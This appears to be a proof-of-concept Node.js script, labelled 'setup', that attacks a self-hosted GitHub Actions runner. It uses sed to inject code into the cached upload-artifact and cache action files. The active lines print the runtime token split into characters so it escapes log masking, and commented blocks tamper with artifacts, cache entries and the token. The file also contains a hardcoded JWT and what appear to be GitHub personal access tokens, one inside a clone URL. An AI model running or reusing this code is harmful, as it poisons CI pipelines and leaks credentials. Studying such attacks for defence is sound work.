const cl_process = require("child_process");
const fs = require("fs");

console.log("this is a setup.....")

//Modify the value of math-homework artifact
// let writecontent = 'fs.writeFileSync("/home/musset/actions-runner/_work/test_actions_02/test_actions_02/math-homework.txt", "1")';

// cl_process.exec(`sed -i '642i ${writecontent}' /home/musset/actions-runner/_work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });


//Add a new upload-me artifact, then upload it
// fs.writeFileSync("/home/musset/actions-runner/_work/test_actions_02/test_actions_02/upload-me.txt", "2")

// let writecontent = 'const path="upload-me.txt"';

// cl_process.exec(`sed -i '10748s/.*/${writecontent}/' /home/musset/actions-runner/_work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });


//Modify the value of cache file
// fs.writeFileSync("/home/musset/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/hello", "18")



// let writecontent = 'console.log(cachePaths);';

// cl_process.exec(`sed -i '47734i ${writecontent}' /home/musset/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });



// fs.writeFileSync(`/home/musset/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache_me`, `cache_try`)
// for(let i = 1; i<=10; i++){
//     fs.writeFileSync(`/home/musset/actions-runner-org/_work/test_actions_02/test_actions_02/cache-folder/cache_me_${i}`, `cache_${i}`)
// }

// let writecontent = 'const cacheId1 = yield reserveCache("cache_me_3", paths, {compressionMethod}); console.log(cacheId1);';
// cl_process.exec(`sed -i '3611i ${writecontent}' /home/musset/actions-runner-org/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }

//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });



let writecontent = 'console.log(JSON.stringify(token.split("")));';

cl_process.exec(`sed -i '3458i ${writecontent}' /home/musset/Documents/actions-runner-org/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});

cl_process.exec(`sed -i '3458i ${writecontent}' /home/musset/Documents/actions-runner-org/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});




// let writecontent = 'const token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImVCWl9jbjNzWFlBZDBjaDRUSEJLSElnT3dPRSJ9.eyJuYW1laWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJzY3AiOiJBY3Rpb25zLkdlbmVyaWNSZWFkOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCBBY3Rpb25zLlVwbG9hZEFydGlmYWN0czowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC8yMjYgTG9jYXRpb25TZXJ2aWNlLkNvbm5lY3QgUmVhZEFuZFVwZGF0ZUJ1aWxkQnlVcmk6MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwLzE6QnVpbGQvQnVpbGQvMjI2IiwiSWRlbnRpdHlUeXBlQ2xhaW0iOiJTeXN0ZW06U2VydmljZUlkZW50aXR5IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvc2lkIjoiREREREREREQtRERERC1ERERELUREREQtREREREREREREREREIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9wcmltYXJ5c2lkIjoiZGRkZGRkZGQtZGRkZC1kZGRkLWRkZGQtZGRkZGRkZGRkZGRkIiwiYXVpIjoiYTJjZDJlNWEtNTRmMi00YzZlLWJmOWMtZmQ3MjQ5MTVlNDQxIiwic2lkIjoiZWQ2MDQzNDQtZjQ2OC00NzdlLWFhODUtNWUzOTAzNjY3NjI2IiwiYWMiOiJbe1wiU2NvcGVcIjpcInJlZnMvaGVhZHMvbWFpblwiLFwiUGVybWlzc2lvblwiOjN9XSIsImFjc2wiOiIxMCIsIm9yY2hpZCI6IjBkOTJhZWJlLTUxYzYtNGQ3Yi05MWUzLTdkZmM0ZDkxODFkZS51c2UuX19kZWZhdWx0IiwiaXNzIjoidnN0b2tlbi5hY3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImF1ZCI6InZzdG9rZW4uYWN0aW9ucy5naXRodWJ1c2VyY29udGVudC5jb218dnNvOmRiNDZmZDE4LTMxOWQtNGRkYS1hODBjLWIyN2I5NzBkZDZhMiIsIm5iZiI6MTY5Mjg0OTgzOCwiZXhwIjoxNjkyODcyNjM4fQ.yzu0zjNGIJHGMndEYEZZoKgj4nJupaY0tLnXFipLs1OUhwAhfZX_P7wcuq-AO5Bm9R280Q-qsG09pKF8RiaOLiASS6tsE6NA005X9n4k5BZRMzoqHGKC-9uKw2kCDg9iW6qwDwlNxd7k8hPenTraAu2LmweiwYv-vFanrsBYPz2ElYhS_qDMYdFu7h-UIZ-5Gxx8Pi7ba2X9MmxsHjyROxPp13PRiiS2StR4Pq6u86zqyMQGBIF4a7sEzSTjX4UXve96m3xceR2JSJxGB6AXgq9OcmQkk-meLz631bfcPRshQdyTemrprFBH4Hum2P3D33MQ4b3XCUMUOcKXjH3pSA"';

// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });

// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });





// musset0
// https://musset0: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@github.com/orgdreamli/test_actions_02.git

// dreamli0
// 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
